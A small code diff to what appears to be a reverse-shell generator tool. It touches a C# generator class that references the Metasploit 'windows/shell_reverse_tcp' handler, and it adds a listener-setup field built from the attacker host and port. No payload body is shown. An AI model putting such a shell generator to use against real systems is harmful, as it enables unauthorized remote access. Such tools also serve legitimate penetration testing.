@@ -1,6 +1,6 @@
 import random
 import string
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, build_listener_setup
 
 
 def _rand_name(length: int) -> str:
@@ -48,6 +48,7 @@ class CSharpGenerator(ShellGenerator):
             listener=listener,
             tty_upgrade=None,
             msf_compat=msf_handler("windows/shell_reverse_tcp", opts.lhost, opts.lport),
+            listener_setup=build_listener_setup(opts.lhost, opts.lport),
         )
 
     def _build_source(self, opts: ShellOptions, class_name: str) -> str:
